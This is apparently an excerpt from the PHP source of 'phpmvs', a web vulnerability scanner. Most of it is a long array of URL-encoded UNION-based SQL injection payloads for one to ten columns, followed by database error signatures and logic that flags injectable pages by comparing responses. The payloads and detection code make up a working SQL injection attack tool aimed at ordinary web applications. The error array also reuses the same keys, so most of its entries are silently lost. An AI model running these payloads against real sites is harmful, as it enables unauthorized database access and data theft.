<?php
// ref http://sourceforge.net/projects/phpmvs/
/* 
...
//shitload of UNION queries array (up to 10 columns)
$b = array(
    '+union+all+select+' . $payload_union . '%23',
    '+union+all+select+NULL,' . $payload_union . '%23',
    '+union+all+select+' . $payload_union . ',NULL%23',
    '+union+all+select+NULL,NULL,' . $payload_union . '%23',
    '+union+all+select+NULL,' . $payload_union . ',NULL%23',
    '+union+all+select+' . $payload_union . ',NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,' . $payload_union . '%23',
    '+union+all+select+NULL,NULL,' . $payload_union . ',NULL%23',
    '+union+all+select+NULL,' . $payload_union . ',NULL,NULL%23',
    '+union+all+select+' . $payload_union . ',NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,' . $payload_union . '%23',
    '+union+all+select+NULL,NULL,NULL,' . $payload_union . ',NULL%23',
    '+union+all+select+NULL,NULL,' . $payload_union . ',NULL,NULL%23',
    '+union+all+select+NULL,' . $payload_union . ',NULL,NULL,NULL%23',
    '+union+all+select+' . $payload_union . ',NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,' . $payload_union . '%23',
    '+union+all+select+NULL,NULL,NULL,NULL,' . $payload_union . ',NULL%23',
    '+union+all+select+NULL,NULL,NULL,' . $payload_union . ',NULL,NULL%23',
    '+union+all+select+NULL,NULL,' . $payload_union . ',NULL,NULL,NULL%23',
    '+union+all+select+NULL,' . $payload_union . ',NULL,NULL,NULL,NULL%23',
    '+union+all+select+' . $payload_union . ',NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,NULL,' . $payload_union . '%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,' . $payload_union . ',NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,' . $payload_union . ',NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,' . $payload_union . ',NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,' . $payload_union . ',NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,' . $payload_union . ',NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+' . $payload_union . ',NULL,NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,NULL,NULL,' . $payload_union . '%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,NULL,' . $payload_union . ',NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,' . $payload_union . ',NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,' . $payload_union . ',NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,' . $payload_union . ',NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,' . $payload_union . ',NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,' . $payload_union . ',NULL,NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+' . $payload_union . ',NULL,NULL,NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,' . $payload_union . '%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,NULL,NULL,' . $payload_union . ',NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,NULL,' . $payload_union . ',NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,' . $payload_union . ',NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,' . $payload_union . ',NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,' . $payload_union . ',NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,' . $payload_union . ',NULL,NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,' . $payload_union . ',NULL,NULL,NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+' . $payload_union . ',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,' . $payload_union . '%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,' . $payload_union . ',NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,NULL,NULL,' . $payload_union . ',NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,NULL,' . $payload_union . ',NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,NULL,' . $payload_union . ',NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,NULL,' . $payload_union . ',NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,NULL,' . $payload_union . ',NULL,NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,NULL,' . $payload_union . ',NULL,NULL,NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+NULL,' . $payload_union . ',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%23',
    '+union+all+select+' . $payload_union . ',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%23',
    '+-666+union+all+select+' . $payload_union . '%23',
    '+-666+union+all+select+1,' . $payload_union . '%23',
    '+-666+union+all+select+' . $payload_union . ',1%23',
    '+-666+union+all+select+1,1,' . $payload_union . '%23',
    '+-666+union+all+select+1,' . $payload_union . ',1%23',
    '+-666+union+all+select+' . $payload_union . ',1,1%23',
    '+-666+union+all+select+1,1,1,' . $payload_union . '%23',
    '+-666+union+all+select+1,1,' . $payload_union . ',1%23',
    '+-666+union+all+select+1,' . $payload_union . ',1,1%23',
    '+-666+union+all+select+' . $payload_union . ',1,1,1%23',
    '+-666+union+all+select+1,1,1,1,' . $payload_union . '%23',
    '+-666+union+all+select+1,1,1,' . $payload_union . ',1%23',
    '+-666+union+all+select+1,1,' . $payload_union . ',1,1%23',
    '+-666+union+all+select+1,' . $payload_union . ',1,1,1%23',
    '+-666+union+all+select+' . $payload_union . ',1,1,1,1%23',
    '+-666+union+all+select+1,1,1,1,1,' . $payload_union . '%23',
    '+-666+union+all+select+1,1,1,1,' . $payload_union . ',1%23',
    '+-666+union+all+select+1,1,1,' . $payload_union . ',1,1%23',
    '+-666+union+all+select+1,1,' . $payload_union . ',1,1,1%23',
    '+-666+union+all+select+1,' . $payload_union . ',1,1,1,1%23',
    '+-666+union+all+select+' . $payload_union . ',1,1,1,1,1%23',
    '+-666+union+all+select+1,1,1,1,1,1,' . $payload_union . '%23',
    '+-666+union+all+select+1,1,1,1,1,' . $payload_union . ',1%23',
    '+-666+union+all+select+1,1,1,1,' . $payload_union . ',1,1%23',
    '+-666+union+all+select+1,1,1,' . $payload_union . ',1,1,1%23',
    '+-666+union+all+select+1,1,' . $payload_union . ',1,1,1,1%23',
    '+-666+union+all+select+1,' . $payload_union . ',1,1,1,1,1%23',
    '+-666+union+all+select+' . $payload_union . ',1,1,1,1,1,1%23',
    '+-666+union+all+select+1,1,1,1,1,1,1,' . $payload_union . '%23',
    '+-666+union+all+select+1,1,1,1,1,1,' . $payload_union . ',1%23',
    '+-666+union+all+select+1,1,1,1,1,' . $payload_union . ',1,1%23',
    '+-666+union+all+select+1,1,1,1,' . $payload_union . ',1,1,1%23',
    '+-666+union+all+select+1,1,1,' . $payload_union . ',1,1,1,1%23',
    '+-666+union+all+select+1,1,' . $payload_union . ',1,1,1,1,1%23',
    '+-666+union+all+select+1,' . $payload_union . ',1,1,1,1,1,1%23',
    '+-666+union+all+select+' . $payload_union . ',1,1,1,1,1,1,1%23',
    '+-666+union+all+select+1,1,1,1,1,1,1,1,' . $payload_union . '%23',
    '+-666+union+all+select+1,1,1,1,1,1,1,' . $payload_union . ',1%23',
    '+-666+union+all+select+1,1,1,1,1,1,' . $payload_union . ',1,1%23',
    '+-666+union+all+select+1,1,1,1,1,' . $payload_union . ',1,1,1%23',
    '+-666+union+all+select+1,1,1,1,' . $payload_union . ',1,1,1,1%23',
    '+-666+union+all+select+1,1,1,' . $payload_union . ',1,1,1,1,1%23',
    '+-666+union+all+select+1,1,' . $payload_union . ',1,1,1,1,1,1%23',
    '+-666+union+all+select+1,' . $payload_union . ',1,1,1,1,1,1,1%23',
    '+-666+union+all+select+' . $payload_union . ',1,1,1,1,1,1,1,1%23',
    '+-666+union+all+select+1,1,1,1,1,1,1,1,1,' . $payload_union . '%23',
    '+-666+union+all+select+1,1,1,1,1,1,1,1,' . $payload_union . ',1%23',
    '+-666+union+all+select+1,1,1,1,1,1,1,' . $payload_union . ',1,1%23',
    '+-666+union+all+select+1,1,1,1,1,1,' . $payload_union . ',1,1,1%23',
    '+-666+union+all+select+1,1,1,1,1,' . $payload_union . ',1,1,1,1%23',
    '+-666+union+all+select+1,1,1,1,' . $payload_union . ',1,1,1,1,1%23',
    '+-666+union+all+select+1,1,1,' . $payload_union . ',1,1,1,1,1,1%23',
    '+-666+union+all+select+1,1,' . $payload_union . ',1,1,1,1,1,1,1%23',
    '+-666+union+all+select+1,' . $payload_union . ',1,1,1,1,1,1,1,1%23',
    '+-666+union+all+select+' . $payload_union . ',1,1,1,1,1,1,1,1,1%23',
    '+%27-666+union+all+select+' . $payload_union . '%23',
    '+%27-666+union+all+select+1,' . $payload_union . '%23',
    '+%27-666+union+all+select+' . $payload_union . ',1%23',
    '+%27-666+union+all+select+1,1,' . $payload_union . '%23',
    '+%27-666+union+all+select+1,' . $payload_union . ',1%23',
    '+%27-666+union+all+select+' . $payload_union . ',1,1%23',
    '+%27-666+union+all+select+1,1,1,' . $payload_union . '%23',
    '+%27-666+union+all+select+1,1,' . $payload_union . ',1%23',
    '+%27-666+union+all+select+1,' . $payload_union . ',1,1%23',
    '+%27-666+union+all+select+' . $payload_union . ',1,1,1%23',
    '+%27-666+union+all+select+1,1,1,1,' . $payload_union . '%23',
    '+%27-666+union+all+select+1,1,1,' . $payload_union . ',1%23',
    '+%27-666+union+all+select+1,1,' . $payload_union . ',1,1%23',
    '+%27-666+union+all+select+1,' . $payload_union . ',1,1,1%23',
    '+%27-666+union+all+select+' . $payload_union . ',1,1,1,1%23',
    '+%27-666+union+all+select+1,1,1,1,1,' . $payload_union . '%23',
    '+%27-666+union+all+select+1,1,1,1,' . $payload_union . ',1%23',
    '+%27-666+union+all+select+1,1,1,' . $payload_union . ',1,1%23',
    '+%27-666+union+all+select+1,1,' . $payload_union . ',1,1,1%23',
    '+%27-666+union+all+select+1,' . $payload_union . ',1,1,1,1%23',
    '+%27-666+union+all+select+' . $payload_union . ',1,1,1,1,1%23',
    '+%27-666+union+all+select+1,1,1,1,1,1,' . $payload_union . '%23',
    '+%27-666+union+all+select+1,1,1,1,1,' . $payload_union . ',1%23',
    '+%27-666+union+all+select+1,1,1,1,' . $payload_union . ',1,1%23',
    '+%27-666+union+all+select+1,1,1,' . $payload_union . ',1,1,1%23',
    '+%27-666+union+all+select+1,1,' . $payload_union . ',1,1,1,1%23',
    '+%27-666+union+all+select+1,' . $payload_union . ',1,1,1,1,1%23',
    '+%27-666+union+all+select+' . $payload_union . ',1,1,1,1,1,1%23',
    '+%27-666+union+all+select+1,1,1,1,1,1,1,' . $payload_union . '%23',
    '+%27-666+union+all+select+1,1,1,1,1,1,' . $payload_union . ',1%23',
    '+%27-666+union+all+select+1,1,1,1,1,' . $payload_union . ',1,1%23',
    '+%27-666+union+all+select+1,1,1,1,' . $payload_union . ',1,1,1%23',
    '+%27-666+union+all+select+1,1,1,' . $payload_union . ',1,1,1,1%23',
    '+%27-666+union+all+select+1,1,' . $payload_union . ',1,1,1,1,1%23',
    '+%27-666+union+all+select+1,' . $payload_union . ',1,1,1,1,1,1%23',
    '+%27-666+union+all+select+' . $payload_union . ',1,1,1,1,1,1,1%23',
    '+%27-666+union+all+select+1,1,1,1,1,1,1,1,' . $payload_union . '%23',
    '+%27-666+union+all+select+1,1,1,1,1,1,1,' . $payload_union . ',1%23',
    '+%27-666+union+all+select+1,1,1,1,1,1,' . $payload_union . ',1,1%23',
    '+%27-666+union+all+select+1,1,1,1,1,' . $payload_union . ',1,1,1%23',
    '+%27-666+union+all+select+1,1,1,1,' . $payload_union . ',1,1,1,1%23',
    '+%27-666+union+all+select+1,1,1,' . $payload_union . ',1,1,1,1,1%23',
    '+%27-666+union+all+select+1,1,' . $payload_union . ',1,1,1,1,1,1%23',
    '+%27-666+union+all+select+1,' . $payload_union . ',1,1,1,1,1,1,1%23',
    '+%27-666+union+all+select+' . $payload_union . ',1,1,1,1,1,1,1,1%23',
    '+%27-666+union+all+select+1,1,1,1,1,1,1,1,1,' . $payload_union . '%23',
    '+%27-666+union+all+select+1,1,1,1,1,1,1,1,' . $payload_union . ',1%23',
    '+%27-666+union+all+select+1,1,1,1,1,1,1,' . $payload_union . ',1,1%23',
    '+%27-666+union+all+select+1,1,1,1,1,1,' . $payload_union . ',1,1,1%23',
    '+%27-666+union+all+select+1,1,1,1,1,' . $payload_union . ',1,1,1,1%23',
    '+%27-666+union+all+select+1,1,1,1,' . $payload_union . ',1,1,1,1,1%23',
    '+%27-666+union+all+select+1,1,1,' . $payload_union . ',1,1,1,1,1,1%23',
    '+%27-666+union+all+select+1,1,' . $payload_union . ',1,1,1,1,1,1,1%23',
    '+%27-666+union+all+select+1,' . $payload_union . ',1,1,1,1,1,1,1,1%23',
    '+%27-666+union+all+select+' . $payload_union . ',1,1,1,1,1,1,1,1,1%23'
);
//mysql_errors_array
$error_messages=array(
    "m"=>"MySQL","m"=>"mysql","m"=>"DB Error: invalid number","m"=>"mysql_fetch_array()","m"=>"MySQL","m"=>"supplied argument is not a valid MySQL","You have an error in your SQL syntax;",
	"m"=>"You have an error in your SQL syntax near","m"=>"MySQL server version for the right syntax to use","m"=>"on MySQL result index","m"=>"mysql_fetch",
	"m"=>"DB Error: unknown error",
    "o"=>"Oracle","o"=>"ORA-","o"=>"ora-","o"=>"ORA-00",
	"p"=>"PostgreSQL","p"=>"pg_query","p"=>"unterminated quoted string","p"=>"pg_exec","p"=>"PostgreSQL query failed:","p"=>"not a valid PostgreSQL result"
);
...
switch (@$frame) {
    ...
    case 8:
        framemvs2();
        break;
    //deleted		case 9: PHPsvc();break; keeping it just for the sake of revenge.
    case 10:
        PHPps_frame();
        break;
    case 11:
...
function framemvs2()
{
	...
	3. ???????<br>
	4. PROFIT!.
	</div><br><br><div>After a long time just some optimizations to the SQLi \"heuristic\".";
}
        ...
        while ($ea < $ef) {
            ...
            if (md5($url_s) != md5($url_s2) or md5($url_s3) != md5($url)) {
                foreach($error_messages as $key=>$value){
					if (strpos($url_s, $value) == TRUE or strpos($url_s2, $value) == TRUE or strpos($url_s3, $value) == TRUE ){
						$type = $key;
						if ($break == 'speed') {
							break;
						}
